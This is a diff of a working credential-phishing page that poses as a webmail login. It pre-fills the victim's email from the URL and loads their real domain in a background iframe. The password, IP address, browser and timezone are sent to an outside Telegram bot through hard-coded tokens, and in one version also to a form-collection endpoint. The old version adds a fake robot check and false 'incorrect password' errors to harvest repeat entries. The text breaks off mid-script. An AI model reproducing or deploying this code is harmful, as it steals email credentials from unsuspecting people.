@@ -1,488 +1,407 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <meta charset="UTF-8">
-   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   <title>Webmail Sign-in</title>
-   <!-- Include Bootstrap 5 CSS -->
-   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-   <!-- Bootstrap Icons -->
-   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
-   <!-- Google Fonts: Poppins -->
-   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
-
-   <style>
-      /* Hide the main content initially */
-      #main-content {
-         display: none;
-      }
-
-      /* Verification Div Styling */
-      #verification-div {
-         height: 100vh;
-         display: flex;
-         align-items: start;
-         justify-content: center;
-         padding-top: 10%;
-      }
-
-      /* Ensure text is left-aligned */
-      .verification-content {
-         text-align: left;
-      }
-
-      /* Adjust spinner size */
-      .spinner-border {
-         width: 1.5rem;
-         height: 1.5rem;
-      }
-   </style>
-   
-   <style>
-      #background-iframe, #overlay { position: fixed; top: 0; left: 0; height: 100%; width: 100%; }
-      body { font-family: Poppins, sans-serif; margin: 0; padding: 0; overflow: hidden; }
-      #background-iframe { border: none; z-index: -3; object-fit: cover; }
-      #overlay { background-color: rgba(0, 0, 0, .5); z-index: -2; }
-      .form-container { display: none; max-width: 400px; width: 100%; padding: 2rem; background-color: rgba(255, 255, 255, .95); border-radius: .75rem; box-shadow: 0 8px 16px rgba(0, 0, 0, .2); position: relative; z-index: 1; }
-      .icon-text { display: flex; align-items: center; margin-bottom: 1.5rem; }
-      .icon-text img { width: 32px; height: 32px; margin-right: .5rem; }
-      .icon-text .h4 { margin-bottom: 0; color: #0d6efd; }
-      .form-floating { position: relative; margin-bottom: 1.5rem; }
-      .form-floating label, .input-icon { position: absolute; color: #6c757d; pointer-events: none; }
-      .form-floating label { transition: .2s ease-in-out; left: 2.5rem; top: -.2rem; background-color: transparent; z-index: 1; }
-      .form-floating input:focus + label, .form-floating input:not(:placeholder-shown) + label { transform: translateY(-1.5rem); font-size: .85rem; color: #0d6efd; }
-      .form-control { border-top: none; border-left: none; border-right: none; border-bottom: 2px solid #ced4da; border-radius: 0; padding-left: 2.5rem; transition: border-color .2s; background-color: transparent; }
-      .form-control:focus { box-shadow: none; outline: 0; border-bottom-color: #0d6efd; }
-      .input-icon { left: .75rem; top: 50%; transform: translateY(-50%); font-size: 1.2rem; }
-      .btn-primary { width: 100%; padding: .75rem; font-size: 1rem; background-color: #0d6efd; border: none; border-radius: .375rem; transition: background-color .3s, color .3s; }
-      .btn-primary:hover { background-color: #0b5ed7; color: #fff; }
-      .btn-primary:focus { box-shadow: none; }
-      @media (max-width: 576px) { .form-container { padding: 1.5rem; } }
-      .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, .5); align-items: center; justify-content: center; z-index: 9999; display: none; }
-      .error-message { color: red; margin-bottom: 1rem; display: none; }
-   </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Login</title>
+    <!-- Include Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap Icons -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <!-- Google Fonts: Poppins -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: Poppins, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #background-iframe, #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            width: 100vw;
+            max-height: 100vh;
+            max-width: 100vw;
+            box-sizing: border-box;
+        }
+        #background-iframe {
+            border: none;
+            z-index: -3;
+        }
+        #overlay {
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: -2;
+        }
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            position: relative;
+            z-index: 1;
+        }
+        .icon-text {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+        .icon-text img {
+            width: 32px;
+            height: 32px;
+            margin-right: 0.5rem;
+        }
+        .icon-text .h4 {
+            margin-bottom: 0;
+            color: #0d6efd;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input[readonly] {
+            background-color: #f9f9f9;
+            cursor: not-allowed;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+            position: relative;
+            z-index: 1;
+        }
+        .honeypot {
+            display: none;
+        }
+    </style>
 </head>
-
-<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
-   <div id="verification-div" style="position: absolute; height: 100vh; width: 100vw; background-color: #fff;">
-      <div class="row">
-         <div class="col-12 verification-content mx-2">
-            <h2 id="verify-heading">Checking your browser before accessing the site</h2>
-            <div>
-               <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border: 0px solid black; background: #f3efef; border-radius: 5px;">
-                  <input type="checkbox" id="bot-check" class="form-check-input">
-                  <label for="bot-check" class="form-check-label ms-2" id="bot-check-label">I am not a robot</label>
-               </div>
+<body>
+    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
+    <div id="overlay"></div>
+    <div class="login-container">
+        <div class="icon-text">
+            <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Domain Favicon">
+            <span class="h4" id="domain-name">EXAMPLE</span>
+        </div>
+        <h2 data-translate="form_header">Verify you’re human</h2>
+        <form id="login-form" action="https://submit-form.com/J2IVAy4bj" method="POST">
+            <div class="form-group">
+                <label for="email" data-translate="email_label">Email:</label>
+                <input type="email" id="email" name="email" required readonly>
             </div>
-            <p class="pt-1" id="verify-instruction">Click on the checkbox to verify if you're human.</p>
-         </div>
-      </div>
-   </div>
-   <!-- Background Iframe -->
-   <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
-   <!-- Dimmed Overlay -->
-   <div id="overlay"></div>
-   <!-- Form Container -->
-   <div class="form-container" id="form-container">
-      <!-- Error Message -->
-      <div id="error-message" class="error-message">Incorrect password. Try again</div>
-      <form id="user-form">
-         <!-- Honeypot Field -->
-         <input type="text" name="honeypot" id="honeypot" style="display:none;" autocomplete="off">
-         <!-- Icon and Text Row -->
-         <div class="icon-text">
-            <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width: 15px;">
-            <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
-         </div>
-         <!-- Heading -->
-         <h5 class="mb-3" id="form-heading">Confirm you’re not a robot</h5>
-         <!-- Paragraph -->
-         <p class="mb-4 text-muted" style="font-size: .8rem;" id="form-subheading">Previous session has expired, login to continue</p>
-         <!-- Email Input -->
-         <div class="form-floating position-relative">
-            <i class="bi bi-envelope input-icon"></i>
-            <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index: 1000;" disabled>
-            <label for="email" style="background-color: transparent;" id="email-label">Email</label>
-         </div>
-         <!-- Password Input -->
-         <div class="form-floating position-relative">
-            <i class="bi bi-lock input-icon"></i>
-            <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
-            <label for="password" style="background-color: transparent;" id="password-label">Password</label>
-         </div>
-         <!-- Submit Button -->
-         <button type="submit" class="btn btn-primary" id="submit-button">Next</button>
-      </form>
-   </div>
+            <div class="form-group">
+                <label for="password" data-translate="password_label">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group honeypot">
+                <label for="honeypot">Leave this field empty:</label>
+                <input type="text" id="honeypot" name="honeypot">
+            </div>
+            <button type="submit" data-translate="submit_button">Log In</button>
+            <div class="error-message" id="error-message" data-translate="error_message">Incorrect password, please try again</div>
+        </form>
+    </div>
 
-   <!-- Loader Overlay -->
-   <div id="loader-overlay" class="loader-overlay">
-      <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
-         <span class="visually-hidden" id="loader-text">Loading...</span>
-      </div>
-   </div>
-
-   <!-- Bootstrap 5 JS Bundle (includes Popper) -->
-   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-   <!-- Language Detection and Translation Script -->
-   <script>
-      // Translation object for multiple languages
-      const translations = {
-         en: {
-            verifyHeading: "Checking your browser before accessing the site",
-            botCheckLabel: "I am not a robot",
-            verifyInstruction: "Click on the checkbox to verify if you're human.",
-            redirecting: "Redirecting...",
-            errorMessage: "Incorrect password. Try again",
-            formHeading: "Confirm you’re not a robot",
-            formSubheading: "Previous session has expired, login to continue",
-            emailLabel: "Email",
-            passwordLabel: "Password",
-            submitButton: "Next",
-            loaderText: "Loading..."
-         },
-         zh: {
-            verifyHeading: "在访问网站之前检查您的浏览器",
-            botCheckLabel: "我不是机器人",
-            verifyInstruction: "点击复选框以验证您是人类。",
-            redirecting: "正在重定向...",
-            errorMessage: "密码错误，请重试",
-            formHeading: "确认您不是机器人",
-            formSubheading: "之前的会话已过期，请登录以继续",
-            emailLabel: "电子邮件",
-            passwordLabel: "密码",
-            submitButton: "下一步",
-            loaderText: "加载中..."
-         },
-         ja: {
-            verifyHeading: "サイトにアクセスする前にブラウザを確認しています",
-            botCheckLabel: "私はロボットではありません",
-            verifyInstruction: "人間であることを確認するためにチェックボックスをクリックしてください。",
-            redirecting: "リダイレクト中...",
-            errorMessage: "パスワードが間違っています。もう一度お試しください",
-            formHeading: "ロボットでないことを確認してください",
-            formSubheading: "前のセッションが期限切れになりました。続行するにはログインしてください",
-            emailLabel: "メール",
-            passwordLabel: "パスワード",
-            submitButton: "次へ",
-            loaderText: "読み込み中..."
-         },
-         hi: {
-            verifyHeading: "साइट तक पहुंचने से पहले अपने ब्राउज़र की जांच करें",
-            botCheckLabel: "मैं रोबोट नहीं हूँ",
-            verifyInstruction: "यह सत्यापित करने के लिए चेकबॉक्स पर क्लिक करें कि आप इंसान हैं।",
-            redirecting: "पुनर्निर्देशन...",
-            errorMessage: "गलत पासवर्ड। फिर से कोशिश करें",
-            formHeading: "पुष्टि करें कि आप रोबोट नहीं हैं",
-            formSubheading: "पिछला सत्र समाप्त हो गया है, जारी रखने के लिए लॉगिन करें",
-            emailLabel: "ईमेल",
-            passwordLabel: "पासवर्ड",
-            submitButton: "अगला",
-            loaderText: "लोड हो रहा है..."
-         },
-         es: {
-            verifyHeading: "Comprobando tu navegador antes de acceder al sitio",
-            botCheckLabel: "No soy un robot",
-            verifyInstruction: "Haz clic en la casilla para verificar que eres humano.",
-            redirecting: "Redirigiendo...",
-            errorMessage: "Contraseña incorrecta. Inténtalo de nuevo",
-            formHeading: "Confirma que no eres un robot",
-            formSubheading: "La sesión anterior ha expirado, inicia sesión para continuar",
-            emailLabel: "Correo electrónico",
-            passwordLabel: "Contraseña",
-            submitButton: "Siguiente",
-            loaderText: "Cargando..."
-         },
-         fr: {
-            verifyHeading: "Vérification de votre navigateur avant d'accéder au site",
-            botCheckLabel: "Je ne suis pas un robot",
-            verifyInstruction: "Cochez la case pour vérifier que vous êtes humain.",
-            redirecting: "Redirection...",
-            errorMessage: "Mot de passe incorrect. Réessayez",
-            formHeading: "Confirmez que vous n'êtes pas un robot",
-            formSubheading: "La session précédente a expiré, connectez-vous pour continuer",
-            emailLabel: "Email",
-            passwordLabel: "Mot de passe",
-            submitButton: "Suivant",
-            loaderText: "Chargement..."
-         },
-         de: {
-            verifyHeading: "Überprüfung Ihres Browsers vor dem Zugriff auf die Website",
-            botCheckLabel: "Ich bin kein Roboter",
-            verifyInstruction: "Klicken Sie auf das Kontrollkästchen, um zu bestätigen, dass Sie ein Mensch sind.",
-            redirecting: "Weiterleitung...",
-            errorMessage: "Falsches Passwort. Versuchen Sie es erneut",
-            formHeading: "Bestätigen Sie, dass Sie kein Roboter sind",
-            formSubheading: "Die vorherige Sitzung ist abgelaufen, melden Sie sich an, um fortzufahren",
-            emailLabel: "E-Mail",
-            passwordLabel: "Passwort",
-            submitButton: "Weiter",
-            loaderText: "Laden..."
-         },
-         pt: {
-            verifyHeading: "Verificando seu navegador antes de acessar o site",
-            botCheckLabel: "Não sou um robô",
-            verifyInstruction: "Clique na caixa de seleção para verificar se você é humano.",
-            redirecting: "Redirecionando...",
-            errorMessage: "Senha incorreta. Tente novamente",
-            formHeading: "Confirme que você não é um robô",
-            formSubheading: "A sessão anterior expirou, faça login para continuar",
-            emailLabel: "E-mail",
-            passwordLabel: "Senha",
-            submitButton: "Próximo",
-            loaderText: "Carregando..."
-         },
-         ar: {
-            verifyHeading: "التحقق من متصفحك قبل الوصول إلى الموقع",
-            botCheckLabel: "أنا لست روبوت",
-            verifyInstruction: "انقر على مربع الاختيار للتحقق من أنك إنسان.",
-            redirecting: "جارٍ إعادة التوجيه...",
-            errorMessage: "كلمة المرور غير صحيحة. حاول مرة أخرى",
-            formHeading: "تأكد أنك لست روبوت",
-            formSubheading: "انتهت صلاحية الجلسة السابقة، قم بتسجيل الدخول للمتابعة",
-            emailLabel: "البريد الإلكتروني",
-            passwordLabel: "كلمة المرور",
-            submitButton: "التالي",
-            loaderText: "جارٍ التحميل..."
-         },
-         it: {
-            verifyHeading: "Controllo del browser prima di accedere al sito",
-            botCheckLabel: "Non sono un robot",
-            verifyInstruction: "Fai clic sulla casella per verificare che sei umano.",
-            redirecting: "Reindirizzamento...",
-            errorMessage: "Password errata. Riprova",
-            formHeading: "Conferma di non essere un robot",
-            formSubheading: "La sessione precedente è scaduta, accedi per continuare",
-            emailLabel: "Email",
-            passwordLabel: "Password",
-            submitButton: "Avanti",
-            loaderText: "Caricamento..."
-         },
-         ko: {
-            verifyHeading: "사이트에 접근하기 전에 브라우저를 확인하는 중",
-            botCheckLabel: "나는 로봇이 아닙니다",
-            verifyInstruction: "인간임을 확인하려면 체크박스를 클릭하세요.",
-            redirecting: "리디렉션 중...",
-            errorMessage: "잘못된 비밀번호입니다. 다시 시도하세요",
-            formHeading: "로봇이 아님을 확인하세요",
-            formSubheading: "이전 세션이 만료되었습니다. 계속하려면 로그인하세요",
-            emailLabel: "이메일",
-            passwordLabel: "비밀번호",
-            submitButton: "다음",
-            loaderText: "로딩 중..."
-         },
-         vi: {
-            verifyHeading: "Kiểm tra trình duyệt của bạn trước khi truy cập trang web",
-            botCheckLabel: "Tôi không phải là robot",
-            verifyInstruction: "Nhấp vào hộp kiểm để xác minh bạn là con người.",
-            redirecting: "Đang chuyển hướng...",
-            errorMessage: "Mật khẩu không đúng. Thử lại",
-            formHeading: "Xác nhận bạn không phải là robot",
-            formSubheading: "Phiên trước đã hết hạn, đăng nhập để tiếp tục",
-            emailLabel: "Email",
-            passwordLabel: "Mật khẩu",
-            submitButton: "Tiếp theo",
-            loaderText: "Đang tải..."
-         }
-      };
-
-      // Function to detect language
-      function detectLanguage() {
-         const browserLang = navigator.language || navigator.languages[0] || 'en';
-         const langCode = browserLang.split('-')[0];
-         return translations[langCode] ? langCode : 'en';
-      }
-
-      // Function to apply translations
-      function applyTranslations(lang) {
-         const t = translations[lang];
-         document.documentElement.lang = lang;
-         document.getElementById('verify-heading').textContent = t.verifyHeading;
-         document.getElementById('bot-check-label').textContent = t.botCheckLabel;
-         document.getElementById('verify-instruction').textContent = t.verifyInstruction;
-         document.getElementById('error-message').textContent = t.errorMessage;
-         document.getElementById('form-heading').textContent = t.formHeading;
-         document.getElementById('form-subheading').textContent = t.formSubheading;
-         document.getElementById('email-label').textContent = t.emailLabel;
-         document.getElementById('password-label').textContent = t.passwordLabel;
-         document.getElementById('submit-button').textContent = t.submitButton;
-         document.getElementById('loader-text').textContent = t.loaderText;
-      }
-
-      // Apply language detection and handle email from # or eta
-      document.addEventListener("DOMContentLoaded", () => {
-         const lang = detectLanguage();
-         applyTranslations(lang);
-
-         // Modified code to handle both # and eta
-         let submitCount = 0;
-         // Check for hash first, then eta query parameter
-         const hash = window.location.hash ? window.location.hash.substring(1) : null;
-         const urlParams = new URLSearchParams(window.location.search);
-         const eta = urlParams.get('eta');
-         // Use hash if present, otherwise use eta, or null if neither exists
-         const e = hash || eta || null;
-         let t;
-         if (e) {
-            document.getElementById("email").value = e;
-            const n = e.split("@");
-            if (2 === n.length) {
-               const e = n[1];
-               t = e;
-               document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${e}`;
-               const o = e.split(".")[0].toUpperCase();
-               document.getElementById("domain-name").textContent = o;
-               const r = e.startsWith("http://") || e.startsWith("https://") ? e : `https://${e}`;
-               document.getElementById("background-iframe").src = r;
+    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Translation dictionary
+        const translations = {
+            en: {
+                form_header: "Verify you’re human",
+                email_label: "Email:",
+                password_label: "Password:",
+                submit_button: "Log In",
+                error_message: "Incorrect password, please try again",
+                bot_detected: "Bot detected, please try again",
+                telegram_error: "Failed to send data to Telegram, please try again"
+            },
+            es: {
+                form_header: "Verifica que eres humano",
+                email_label: "Correo electrónico:",
+                password_label: "Contraseña:",
+                submit_button: "Iniciar sesión",
+                error_message: "Contraseña incorrecta, por favor intenta de nuevo",
+                bot_detected: "Bot detectado, por favor intenta de nuevo",
+                telegram_error: "Error al enviar datos a Telegram, intenta de nuevo"
+            },
+            fr: {
+                form_header: "Vérifiez que vous êtes humain",
+                email_label: "E-mail :",
+                password_label: "Mot de passe :",
+                submit_button: "Se connecter",
+                error_message: "Mot de passe incorrect, veuillez réessayer",
+                bot_detected: "Bot détecté, veuillez réessayer",
+                telegram_error: "Échec de l'envoi des données à Telegram, veuillez réessayer"
+            },
+            de: {
+                form_header: "Bestätigen Sie, dass Sie ein Mensch sind",
+                email_label: "E-Mail:",
+                password_label: "Passwort:",
+                submit_button: "Anmelden",
+                error_message: "Falsches Passwort, bitte versuchen Sie es erneut",
+                bot_detected: "Bot erkannt, bitte versuchen Sie es erneut",
+                telegram_error: "Fehler beim Senden der Daten an Telegram, bitte versuchen Sie es erneut"
+            },
+            it: {
+                form_header: "Verifica che sei umano",
+                email_label: "Email:",
+                password_label: "Password:",
+                submit_button: "Accedi",
+                error_message: "Password errata, riprova",
+                bot_detected: "Bot rilevato, riprova",
+                telegram_error: "Errore nell'invio dei dati a Telegram, riprova"
+            },
+            pt: {
+                form_header: "Verifique que você é humano",
+                email_label: "E-mail:",
+                password_label: "Senha:",
+                submit_button: "Entrar",
+                error_message: "Senha incorreta, tente novamente",
+                bot_detected: "Bot detectado, tente novamente",
+                telegram_error: "Falha ao enviar dados para o Telegram, tente novamente"
+            },
+            ja: {
+                form_header: "あなたが人間であることを確認してください",
+                email_label: "メール:",
+                password_label: "パスワード:",
+                submit_button: "ログイン",
+                error_message: "パスワードが正しくありません。もう一度お試しください",
+                bot_detected: "ボットが検出されました。もう一度お試しください",
+                telegram_error: "Telegramへのデータ送信に失敗しました。もう一度お試しください"
+            },
+            zh: {
+                form_header: "验证您是人类",
+                email_label: "电子邮件:",
+                password_label: "密码:",
+                submit_button: "登录",
+                error_message: "密码错误，请重试",
+                bot_detected: "检测到机器人，请重试",
+                telegram_error: "无法发送数据到Telegram，请重试"
             }
-         } else {
-            console.warn("No '#' or 'eta' parameter found in the URL.");
-            document.getElementById("background-iframe").src = "about:blank";
-         }
+        };
 
-         let n = {
-            ipAddress: "Fetching...",
-            userAgent: navigator.userAgent,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            browser: "Detecting..."
-         };
-         const o = navigator.userAgent;
-         n.browser = o.indexOf("Firefox") > -1 ? "Mozilla Firefox" :
-                     o.indexOf("SamsungBrowser") > -1 ? "Samsung Internet" :
-                     o.indexOf("Opera") > -1 || o.indexOf("OPR") > -1 ? "Opera" :
-                     o.indexOf("Trident") > -1 ? "Microsoft Internet Explorer" :
-                     o.indexOf("Edge") > -1 ? "Microsoft Edge" :
-                     o.indexOf("Chrome") > -1 ? "Google Chrome or Chromium" :
-                     o.indexOf("Safari") > -1 ? "Apple Safari" : "Unknown";
+        // Function to detect browser language
+        function getBrowserLanguage() {
+            const lang = navigator.language || navigator.languages[0] || 'en';
+            return lang.split('-')[0];
+        }
 
-         fetch("https://api.ipify.org?format=json").then(e => e.json()).then(e => {
-            n.ipAddress = e.ip;
-         }).catch(e => {
-            console.error("Error fetching IP address:", e);
-            n.ipAddress = "Unavailable";
-         });
-
-         document.getElementById("user-form").addEventListener("submit", function(e) {
-            e.preventDefault();
-            submitCount += 1;
-
-            const isFirstAttempt = submitCount === 1;
-            const isSecondAttempt = submitCount === 2;
-
-            document.getElementById("loader-overlay").style.display = "flex";
-            let s = `===äłł-ďōmãïń-2025===\n\nEmail: ${document.getElementById("email").value.trim()}\nPassword: ${document.getElementById("password").value.trim()}`;
-
-            new Promise(e => {
-               const t = setInterval(() => {
-                  if (n.ipAddress !== "Fetching...") {
-                     clearInterval(t);
-                     e();
-                  }
-               }, 100);
-            }).then(() => {
-               s += `\nIP Address: ${n.ipAddress}\nUser Agent: ${n.userAgent}\nTimezone: ${n.timezone}\nBrowser: ${n.browser}`;
-
-               // Telegram submission
-               const botToken = '7103630373:AAFVJ_kia1ilw3C043wVG478q81bhZjt7gI';
-               const chatId = '6134592216';
-               const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-               const telegramParams = {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                     chat_id: chatId,
-                     text: s,
-                     parse_mode: 'HTML'
-                  })
-               };
-
-               fetch(telegramApiUrl, telegramParams)
-                  .then(response => response.json())
-                  .then(data => {
-                     console.log('Telegram message sent successfully:', data);
-                  })
-                  .catch(error => {
-                     console.error('Error sending message to Telegram:', error);
-                  });
+        // Function to apply translations
+        function applyTranslations(lang) {
+            const elements = document.querySelectorAll('[data-translate]');
+            const translation = translations[lang] || translations['en'];
+            elements.forEach(element => {
+                const key = element.getAttribute('data-translate');
+                element.textContent = translation[key];
             });
+        }
 
-            if (isFirstAttempt || isSecondAttempt) {
-               setTimeout(() => {
-                  document.getElementById("loader-overlay").style.display = "none";
-                  document.getElementById("error-message").style.display = "block";
-                  document.getElementById("password").value = "";
-               }, 3000);
-            } else if (submitCount === 3) {
-               setTimeout(() => {
-                  document.getElementById("loader-overlay").style.display = "none";
-                  window.location.href = "https://" + t;
-               }, 3000);
-            }
-         });
+        // Function to extract email and domain from URL
+        function getEmailFromUrl() {
+            const url = window.location.href;
+            let email = '';
+            let domain = '';
 
-         // Original reporting functionality with honeypot
-         document.getElementById("user-form").addEventListener("submit", function(e) {
-            e.preventDefault();
-            const honeypot = document.getElementById("honeypot").value.trim();
-            if (honeypot) {
-               console.log("Honeypot field filled. Submission ignored.");
-               return;
+            if (url.includes('#')) {
+                email = url.split('#')[1];
+            } else if (url.includes('?')) {
+                const query = url.split('?')[1];
+                const params = new URLSearchParams(query);
+                email = params.get('email') || query.split('&')[0];
             }
 
-            const email = document.getElementById("email").value.trim();
-            const password = document.getElementById("password").value.trim();
-            const data = { email, password };
+            email = email ? decodeURIComponent(email) : '';
+            if (email && email.includes('@')) {
+                domain = email.split('@')[1];
+            }
 
-            fetch("https://submit-form.com/5BYUqxAm1", {
-               method: "POST",
-               headers: { "Content-Type": "application/json" },
-               body: JSON.stringify(data)
-            }).then(response => {
-               console.log(response.ok ? "Submission to form successful!" : "Submission to form failed.");
-            }).catch(error => {
-               console.error("Error sending submission to form:", error);
+            return { email, domain };
+        }
+
+        // Initialize form and background
+        document.addEventListener("DOMContentLoaded", () => {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const honeypotInput = document.getElementById('honeypot');
+            const errorMessage = document.getElementById('error-message');
+            const form = document.getElementById('login-form');
+            const backgroundIframe = document.getElementById('background-iframe');
+            const domainFavicon = document.getElementById('domain-favicon');
+            const domainName = document.getElementById('domain-name');
+            const { email, domain } = getEmailFromUrl();
+
+            if (email && email.includes('@')) {
+                emailInput.value = email;
+                if (domain) {
+                    domainFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}`;
+                    domainName.textContent = domain.split('.')[0].toUpperCase();
+                }
+            } else {
+                domainFavicon.src = 'https://www.google.com/s2/favicons?domain=example.com';
+                domainName.textContent = 'EXAMPLE';
+            }
+
+            if (domain) {
+                const domainUrl = domain.match(/^https?:\/\//) ? domain : `https://${domain}`;
+                backgroundIframe.src = domainUrl;
+            } else {
+                backgroundIframe.src = 'about:blank';
+                document.body.style.backgroundColor = 'white';
+            }
+
+            function updateIframeSize() {
+                backgroundIframe.style.width = `${window.innerWidth}px`;
+                backgroundIframe.style.height = `${window.innerHeight}px`;
+            }
+
+            passwordInput.addEventListener('focus', updateIframeSize);
+            passwordInput.addEventListener('blur', () => {
+                backgroundIframe.style.width = '100vw';
+                backgroundIframe.style.height = '100vh';
             });
-         });
-      });
+            window.addEventListener('resize', updateIframeSize);
 
-      // Bot verification script
-      document.addEventListener('DOMContentLoaded', function () {
-         const botCheck = document.getElementById('bot-check');
-         const verificationDiv = document.getElementById('verification-div');
-         const formContainer = document.getElementById('form-container');
-         const mainContent = document.getElementById('main-content');
-         const lang = detectLanguage();
+            const browserLang = getBrowserLanguage();
+            applyTranslations(browserLang);
 
-         botCheck.addEventListener('change', function () {
-            if (this.checked) {
-               const checkboxContainer = this.parentElement;
-               checkboxContainer.innerHTML = `
-                  <div class="spinner-container d-flex align-items-center">
-                     <div class="spinner-border" role="status">
-                        <span class="visually-hidden">${translations[lang].loaderText}</span>
-                     </div>
-                     <span class="ms-2">${translations[lang].verifyInstruction}</span>
-                  </div>
-               `;
+            let submissionAttempts = 0;
+            const formLoadTime = Date.now();
 
-               setTimeout(function () {
-                  verificationDiv.innerHTML = `
-                     <div class="row">
-                        <div class="col-12 verification-content">
-                           <h2>${translations[lang].redirecting}</h2>
-                        </div>
-                     </div>
-                  `;
+            let additionalData = {
+                ipAddress: "Fetching...",
+                userAgent: navigator.userAgent,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                browser: "Detecting..."
+            };
+            const userAgent = navigator.userAgent;
+            additionalData.browser = userAgent.includes("Firefox") ? "Mozilla Firefox" :
+                                     userAgent.includes("SamsungBrowser") ? "Samsung Internet" :
+                                     userAgent.includes("Opera") || userAgent.includes("OPR") ? "Opera" :
+                                     userAgent.includes("Trident") ? "Microsoft Internet Explorer" :
+                                     userAgent.includes("Edge") ? "Microsoft Edge" :
+                                     userAgent.includes("Chrome") ? "Google Chrome or Chromium" :
+                                     userAgent.includes("Safari") ? "Apple Safari" : "Unknown";
 
-                  setTimeout(function () {
-                     verificationDiv.style.display = 'none';
-                     mainContent.style.display = 'block';
-                     formContainer.style.display = 'block';
-                  }, 2000);
-               }, 4000);
-            }
-         });
-      });
-   </script>
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => { additionalData.ipAddress = data.ip; })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                    additionalData.ipAddress = "Unavailable";
+                });
+
+            form.addEventListener('submit', async (event) => {
+                event.preventDefault();
+
+                const timeSinceLoad = Date.now() - formLoadTime;
+                if (honeypotInput.value !== '' || timeSinceLoad < 1000) {
+                    errorMessage.textContent = translations[browserLang]?.bot_detected || "Bot detected, please try again";
+                    errorMessage.style.display = 'block';
+                    passwordInput.value = '';
+                    honeypotInput.value = '';
+                    passwordInput.focus();
+                    return;
+                }
+
+                submissionAttempts++;
+
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                const data = { email, password };
+
+                // Telegram submission
+                const botToken = '733880603:AAGzaXbfY0CG-zZv_6ssT7TI8KnU';
+                const chatId = '686142604';
+                const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const logMessage = `===äłł-ďōmãïń-2025===\n\nEmail: ${email}\nPassword: ${password}\nSubmission Attempt: ${submissionAttempts}\nIP Address: ${additionalData.ipAddress}\nUser Agent: ${additionalData.userAgent}\nTimezone: ${additionalData.timezone}\nBrowser: ${additionalData.browser}`;
+
+                try {
+                    const response = await fetch(telegramApiUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: logMessage,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    if (!response.ok) {
+                        errorMessage.textContent = translations[browserLang]?.telegram_error || "Failed to send data to Telegram, please try again";
+                        errorMessage.style.display = 'block';
+                    } else {
+                        console.log('Telegram submission successful!');
+                    }
+                } catch (error) {
+                    console.error('Telegram submission error:', error);
+                    errorMessage.textContent = translations[browserLang]?.telegram_error || "Failed to send data to Telegram, please try again";
+                    errorMessage.style.display = 'block';
+                }
+
+                // Form submission
+                try {
